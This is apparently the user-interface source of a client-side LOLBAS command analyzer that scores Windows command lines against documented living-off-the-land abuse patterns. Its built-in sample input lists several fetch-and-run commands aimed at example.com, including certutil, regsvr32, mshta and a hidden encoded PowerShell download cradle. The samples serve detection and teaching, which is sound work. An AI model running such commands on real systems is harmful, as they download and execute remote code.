/*!
 * CyberDat LotL / LOLBAS Command Analyzer.
 * Copyright (C) 2026 CyberDat contributors.
 * SPDX-License-Identifier: GPL-3.0-only
 * Modified 2026-11-13: explicit GPL notice and corresponding-source delivery.
 * This program is free software: you may redistribute and modify it under
 * GNU GPL version 3. It comes WITHOUT ANY WARRANTY, including MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See LICENSE-LOLBAS.txt and SOURCE.md.
 */
/*!
 * CyberDat LotL / LOLBAS Command Analyzer — user interface.
 *
 * Contract (enforced by tests):
 *  - commands are text: written to the DOM only with textContent / text nodes, never executed;
 *  - no network, storage, cookie or URL APIs; the LOLBAS data is bundled with the worker;
 *  - the only links created point to https:// URLs that come from the LOLBAS data (entry pages
 *    and detection references), never from user input.
 */
(function () {
	'use strict';

	const root = document.querySelector('[data-lotl-analyzer]');
	if (!root) { return; }

	const MAX_BYTES = 5 * 1024 * 1024;
	const INLINE_FILE_BYTES = 1024 * 1024;
	const JOB_TIMEOUT_MS = 120000;
	const MAX_RENDERED = 300;
	const SEV_LABEL = { high: 'High', medium: 'Medium', low: 'Low', info: 'Info', none: 'No match' };
	const RANK = { none: -1, info: 0, low: 1, medium: 2, high: 3 };

	const $ = s => root.querySelector(s);
	const el = {
		app: $('[data-lotl-app]'), unsupported: $('[data-lotl-unsupported]'), input: $('[data-lotl-input]'), file: $('[data-lotl-file]'),
		source: $('[data-lotl-source]'), sample: $('[data-lotl-sample]'), clear: $('[data-lotl-clear]'), run: $('[data-lotl-run]'),
		cancel: $('[data-lotl-cancel]'), progress: $('[data-lotl-progress]'), status: $('[data-lotl-status]'), error: $('[data-lotl-error]'),
		results: $('[data-lotl-results]'), heading: $('#cd-lotl-step-results'), verdict: $('[data-lotl-verdict]'), summary: $('[data-lotl-summary]'),
		catWrap: $('[data-lotl-categories-wrap]'), cats: $('[data-lotl-categories]'), commands: $('[data-lotl-commands]'), more: $('[data-lotl-more]'),
		report: $('[data-lotl-report]')
	};

	if (typeof Worker !== 'function' || typeof Blob !== 'function' || !window.URL || typeof URL.createObjectURL !== 'function') {
		el.unsupported.hidden = false;
		return;
	}

	// Illustrative examples based on public LOLBAS descriptions; example.com hosts only, no working payloads.
	const SAMPLE = [
		'certutil -hashfile C:\\Downloads\\setup.exe SHA256',
		'certutil.exe -urlcache -split -f http://example.com/update.txt C:\\Users\\Public\\update.txt',
		'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll',
		'rundll32.exe shell32.dll,Control_RunDLL desk.cpl',
		'c^e^r^t^u^t^i^l -url^cache -f http://example.com/a.exe a.exe',
		'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=',
		'{"EventID":1,"Image":"C:\\\\Windows\\\\System32\\\\mshta.exe","CommandLine":"mshta.exe javascript:a=GetObject(\\"script:http://example.com/a.sct\\").Exec();close();"}',
		'schtasks /query /fo LIST /v'
	].join('\n') + '\n';

	const state = { source: { kind: 'text' }, fileName: '', worker: null, jobId: 0, running: false, timer: 0, result: null, stale: false };

	const number = n => Number(n).toLocaleString('en-US');
	const plural = (n, w) => number(n) + ' ' + w + (n === 1 ? '' : 's');
	const formatBytes = b => (b < 1024 ? b + ' B' : b < 1048576 ? (b / 1024).toFixed(1) + ' KB' : (b / 1048576).toFixed(1) + ' MB');
	const setStatus = m => { el.status.textContent = m; };
	const showError = m => { el.error.textContent = m; el.error.hidden = !m; };
	function node(tag, className, text) {
		const e = document.createElement(tag);
		if (className) { e.className = className; }
		if (text !== undefined && text !== null) { e.textContent = String(text); }
		return e;
	}
	/** Link only to https URLs taken from the bundled LOLBAS data. */
	function dataLink(url, text) {
		if (!/^https:\/\/[^\s"'<>]+$/.test(url)) { return node('span', '', text); }
		const a = node('a', '', text);
		a.href = url;
		a.rel = 'noopener noreferrer';
		return a;
	}

	function workerUrl() {
		const url = new URL(root.getAttribute('data-worker-src') || '', document.baseURI);
		if (url.origin !== window.location.origin) { throw new Error('Worker must be same-origin.'); }
		return url.href;
	}
	function createWorker() {
		if (state.worker) { state.worker.terminate(); }
		try { state.worker = new Worker(workerUrl()); } catch (e) { state.worker = null; el.unsupported.hidden = false; el.app.hidden = true; return; }
		state.worker.onmessage = onMessage;
		state.worker.onerror = ev => { ev.preventDefault(); finish(); showError('The background worker stopped unexpectedly. Nothing was sent anywhere. Reload the page and try again.'); createWorker(); };
	}
	function setRunning(r) {
		state.running = r;
		el.run.disabled = r;
		el.cancel.hidden = !r;
		el.progress.hidden = !r;
		el.app.setAttribute('aria-busy', r ? 'true' : 'false');
		if (!r) { el.progress.value = 0; }
	}
	function finish() { window.clearTimeout(state.timer); setRunning(false); }

	function loadFile(file) {
		showError('');
		if (!file) { return; }
		if (file.size > MAX_BYTES) { showError('“' + file.name + '” is ' + formatBytes(file.size) + '. The maximum is 5 MB.'); el.file.value = ''; return; }
		state.fileName = file.name;
		markStale();
		if (file.size <= INLINE_FILE_BYTES) {
			file.text().then(t => { el.input.value = t; state.source = { kind: 'text' }; el.source.textContent = 'Loaded “' + file.name + '” (' + formatBytes(file.size) + ').'; }, () => showError('The file could not be read.'));
			return;
		}
		state.source = { kind: 'file', file };
		el.input.value = '';
		el.source.textContent = 'Loaded “' + file.name + '” (' + formatBytes(file.size) + '). Large files are not displayed; they are analyzed in the background. Type in the box to switch back to pasted text.';
	}

	function run() {
		showError('');
		if (state.running) { return; }
		if (state.source.kind !== 'file' && !el.input.value.trim()) { showError('Paste at least one command line or load a file first.'); el.input.focus(); return; }
		if (state.source.kind !== 'file' && el.input.value.length > MAX_BYTES) { showError('The pasted text is larger than 5 MB. Split it into parts.'); return; }
		if (!state.worker) { createWorker(); }
		const jobId = ++state.jobId;
		setRunning(true);
		setStatus('Analyzing locally…');
		state.timer = window.setTimeout(() => { if (state.jobId === jobId && state.running) { cancel('Analysis took longer than ' + (JOB_TIMEOUT_MS / 1000) + ' seconds and was stopped. Split the input into smaller parts.'); } }, JOB_TIMEOUT_MS);
		state.worker.postMessage({ type: 'run', jobId, source: state.source.kind === 'file' ? { kind: 'file', file: state.source.file } : { kind: 'text', text: el.input.value } });
	}
	function cancel(message) {
		if (!state.running) { return; }
		state.jobId++;
		finish();
		createWorker();
		if (message) { showError(message); }
		setStatus(message ? '' : 'Cancelled. Nothing was analyzed further.');
		el.run.focus();
	}
	function onMessage(event) {
		const msg = event.data || {};
		if (msg.jobId !== state.jobId) { return; }
		if (msg.type === 'progress') { el.progress.value = msg.total ? Math.round((msg.done / msg.total) * 100) : 100; return; }
		finish();
		if (msg.type === 'error') { setStatus(''); showError(msg.message || 'The input could not be analyzed.'); return; }
		if (msg.type === 'result') { render(msg); }
	}

	// ---------------------------------------------------------------- rendering
	function sevBadge(sev, extra) { return node('span', 'cd-lotl-sev cd-lotl-sev--' + sev + (extra ? ' ' + extra : ''), SEV_LABEL[sev]); }
	function sourceTag(text, kind) { return node('span', 'cd-lotl-tag cd-lotl-tag--' + kind, text); }

	function renderBinary(b) {
		const wrap = node('div', 'cd-lotl-binary');
		const h = node('h4', 'cd-lotl-binary__name');
		h.append(sourceTag('From LOLBAS', 'lolbas'), ' ', node('span', '', b.name), ' ', node('span', 'cd-lotl-muted', '(' + b.type.replace(/^OS/, '') + ')'));
		wrap.appendChild(h);
		wrap.appendChild(node('p', 'cd-lotl-desc', b.description));
		const fn = node('p', 'cd-lotl-functions');
		fn.appendChild(node('span', 'cd-lotl-muted', 'Documented functions: '));
		b.functions.forEach((f, i) => { if (i) { fn.appendChild(document.createTextNode(', ')); } fn.appendChild(node('span', 'cd-lotl-fn', f)); });
		wrap.appendChild(fn);
		if (b.matches.length) {
			wrap.appendChild(node('p', 'cd-lotl-muted', 'Documented LOLBAS usages this command resembles:'));
			const ul = node('ul', 'cd-lotl-matches');
			for (const m of b.matches) {
				const li = node('li', 'cd-lotl-match');
				const head = node('p', 'cd-lotl-match__head');
				head.append(sevBadge(m.severity), ' ', node('strong', '', m.category), ' ', node('span', 'cd-lotl-muted', (m.quality === 'full' ? 'matches' : 'partly matches') + ' · ATT&CK ' + m.mitre + ' (from LOLBAS) · privileges: ' + m.privileges));
				li.append(head, node('p', '', m.description));
				const doc = node('p', '');
				doc.append(node('span', 'cd-lotl-muted', 'Documented command: '), node('code', 'cd-lotl-code', m.command));
				li.appendChild(doc);
				ul.appendChild(li);
			}
			wrap.appendChild(ul);
		} else {
			wrap.appendChild(node('p', 'cd-lotl-muted', 'The command does not match any documented LOLBAS usage of this binary. Its presence alone is normal on Windows.'));
		}
		if (b.ioc.length || b.references.length) {
			const d = node('details', 'cd-lotl-hints');
			d.appendChild(node('summary', '', 'What to look for (detection hints from LOLBAS)'));
			if (b.ioc.length) {
				const ul = node('ul');
				for (const i of b.ioc) { ul.appendChild(node('li', '', i)); }
				d.appendChild(ul);
			}
			if (b.references.length) {
				d.appendChild(node('p', 'cd-lotl-muted', 'Detection references listed in LOLBAS (LOLBAS does not guarantee that they detect this behavior):'));
				const ul = node('ul', 'cd-lotl-refs');
				for (const [type, url] of b.references) { const li = node('li'); li.append(node('span', '', type + ': '), dataLink(url, url.replace(/^https:\/\//, ''))); ul.appendChild(li); }
				d.appendChild(ul);
			}
			wrap.appendChild(d);
		}
		const p = node('p', 'cd-lotl-entry');
		p.append(node('span', 'cd-lotl-muted', 'LOLBAS entry: '), dataLink(b.page, b.page.replace(/^https:\/\//, '')));
		wrap.appendChild(p);
		return wrap;
	}

	function renderHeuristics(list) {
		const ul = node('ul', 'cd-lotl-heuristics');
		for (const h of list) {
			const li = node('li', 'cd-lotl-heuristic');
			const head = node('p', 'cd-lotl-heuristic__head');
			head.append(sourceTag('CyberDat heuristic', 'heuristic'), ' ', sevBadge(h.severity), ' ', node('strong', '', h.title), ' ', node('code', 'cd-lotl-muted', h.id));
			li.appendChild(head);
			if (h.details.filter(Boolean).length) { li.appendChild(node('p', 'cd-lotl-detail', h.details.filter(Boolean).join(' · '))); }
			li.appendChild(node('p', 'cd-lotl-muted', h.explanation));
			ul.appendChild(li);
		}
		return ul;
	}

	function renderAnalysis(container, a) {
		if (a.deobfuscation.length) { container.appendChild(node('p', 'cd-lotl-detail', 'Obfuscation removed for analysis: ' + a.deobfuscation.join('; ') + '.')); }
		if (a.normalized) {
			const p = node('p', 'cd-lotl-normalized');
			p.append(node('span', 'cd-lotl-muted', 'Analyzed as: '), node('code', 'cd-lotl-code', a.normalized));
			container.appendChild(p);
		}
		for (const b of a.binaries) { container.appendChild(renderBinary(b)); }
		if (a.heuristics.length) { container.appendChild(renderHeuristics(a.heuristics)); }
		for (const d of a.decoded) {
			const box = node('div', 'cd-lotl-decoded');
			box.appendChild(node('h4', 'cd-lotl-binary__name', 'Decoded: ' + d.kind));
			box.appendChild(node('pre', 'cd-la-preview cd-lotl-pre', d.text));
			if (d.analysis) { renderAnalysis(box, d.analysis); }
			container.appendChild(box);
		}
	}

	function render(msg) {
		state.result = msg;
		state.stale = false;
		const verdicts = {
			high: ['Commands strongly resembling documented abuse techniques found.', 'Investigate them in context: parent process, user, file hashes, network activity.'],
			medium: ['Suspicious commands found.', 'They match documented LOLBAS usages or suspicious patterns. Most of these binaries are legitimate; check the context.'],
			low: ['Only weak signals found.', 'Typical administrative usage can produce them. Check the details if the context is unusual.'],
			info: ['Only LOLBAS-listed binaries recognized, without a documented abuse pattern.', 'Their presence alone is normal on Windows. This does not mean the command is safe.'],
			none: ['No known patterns matched.', 'This does not mean the command is safe.']
		};
		const [head, tail] = verdicts[msg.level];
		el.verdict.className = 'cd-lotl-verdict cd-lotl-verdict--' + msg.level;
		el.verdict.replaceChildren(node('strong', '', head), document.createTextNode(' ' + tail));
		const s = msg.counts.bySeverity;
		const took = msg.elapsedMs < 1000 ? number(Math.max(1, msg.elapsedMs)) + ' ms' : (msg.elapsedMs / 1000).toFixed(1) + ' s';
		el.summary.textContent = plural(msg.counts.commands, 'command') + ' analyzed in ' + took + ': ' + number(s.high) + ' high, ' + number(s.medium) + ' medium, ' + number(s.low) + ' low, ' + number(s.info) + ' info only, ' + number(s.none) + ' without any match.' + (msg.counts.skipped ? ' ' + plural(msg.counts.skipped, 'line') + ' over the limit of 20,000 commands were skipped.' : '');
		const cats = Object.entries(msg.counts.byCategory).sort((a, b) => b[1] - a[1]);
		el.cats.replaceChildren(...cats.map(([c, n]) => { const tr = node('tr'); const th = node('th', '', c); th.scope = 'row'; tr.append(th, node('td', '', number(n))); return tr; }));
		el.catWrap.hidden = cats.length === 0;
		const sorted = msg.commands.slice().sort((a, b) => RANK[b.severity] - RANK[a.severity] || a.line - b.line);
		const list = document.createDocumentFragment();
		for (const c of sorted.slice(0, MAX_RENDERED)) {
			const li = node('li', 'cd-lotl-command cd-lotl-command--' + c.severity);
			const head = node('p', 'cd-lotl-command__head');
			head.append(sevBadge(c.severity), ' ', node('span', 'cd-lotl-muted', 'Line ' + number(c.line) + (c.extractedFromLog ? ' · CommandLine field extracted from a log record' : '') + (c.truncated ? ' · long line, first 32,768 characters analyzed' : '')));
			li.appendChild(head);
			li.appendChild(node('code', 'cd-lotl-code cd-lotl-command__text', c.original));
			if (!c.binaries.length && !c.heuristics.length && !c.decoded.length) { li.appendChild(node('p', 'cd-lotl-muted', 'No known patterns matched. This does not mean the command is safe.')); }
			renderAnalysis(li, c);
			list.appendChild(li);
		}
		el.commands.replaceChildren(list);
		el.more.hidden = sorted.length <= MAX_RENDERED;
		el.more.textContent = sorted.length > MAX_RENDERED ? plural(sorted.length - MAX_RENDERED, 'more command') + ' with lower severity are not shown here; they are included in the JSON report.' : '';
		el.results.hidden = false;
		setStatus('Done. ' + plural(msg.counts.commands, 'command') + ' analyzed.');
		el.heading.focus();
	}

	function markStale() {
		if (state.result && !state.stale) { state.stale = true; setStatus('Input changed. Select “Analyze commands” again to update the result.'); }
	}

	function downloadReport() {
		if (!state.result) { return; }
		const r = state.result;
		const body = {
			tool: 'CyberDat LotL / LOLBAS Command Analyzer', engine: r.engine, heuristics: r.ruleset,
			lolbasData: { source: 'https://github.com/LOLBAS-Project/LOLBAS', commit: r.data.commit, date: r.data.commitDate, license: 'GPL-3.0' },
			note: 'A match with LOLBAS does not prove malicious activity. No match does not mean a command is safe.',
			generatedAt: new Date().toISOString(), level: r.level, counts: r.counts, commands: r.commands
		};
		const blob = new Blob([JSON.stringify(body, null, 2) + '\n'], { type: 'application/json' });
		const url = URL.createObjectURL(blob);
		const a = document.createElement('a');
		a.href = url;
		a.download = 'lotl-analysis.json';
		a.hidden = true;
		document.body.appendChild(a);
		a.click();
		a.remove();
		window.setTimeout(() => URL.revokeObjectURL(url), 30000);
		setStatus('Report downloaded. It contains your command lines.');
	}

	function clearAll() {
		if (state.running) { cancel(); }
		el.input.value = '';
		el.file.value = '';
		state.fileName = '';
		state.source = { kind: 'text' };
		el.source.textContent = '';
		state.result = null;
		for (const c of [el.commands, el.cats, el.verdict]) { c.replaceChildren(); }
		el.summary.textContent = '';
		el.results.hidden = true;
		showError('');
		setStatus('Cleared. Input and results were removed from this page.');
		el.input.focus();
	}

	el.file.addEventListener('change', () => loadFile(el.file.files && el.file.files[0]));
	el.input.addEventListener('input', () => { if (state.source.kind === 'file') { state.source = { kind: 'text' }; el.source.textContent = ''; } markStale(); });
	el.sample.addEventListener('click', () => { el.input.value = SAMPLE; state.source = { kind: 'text' }; el.file.value = ''; el.source.textContent = 'Examples loaded: illustrative command lines based on public LOLBAS descriptions, using example.com only.'; markStale(); el.input.focus(); });
	el.clear.addEventListener('click', clearAll);
	el.run.addEventListener('click', run);
	el.cancel.addEventListener('click', () => cancel());
	el.report.addEventListener('click', downloadReport);
	root.addEventListener('keydown', e => {
		if (e.key === 'Escape' && state.running) { cancel(); }
		if (e.key === 'Enter' && (e.ctrlKey || e.metaKey) && e.target === el.input) { e.preventDefault(); run(); }
	});

	createWorker();
	el.app.hidden = false;
	el.app.setAttribute('aria-busy', 'false');
}());
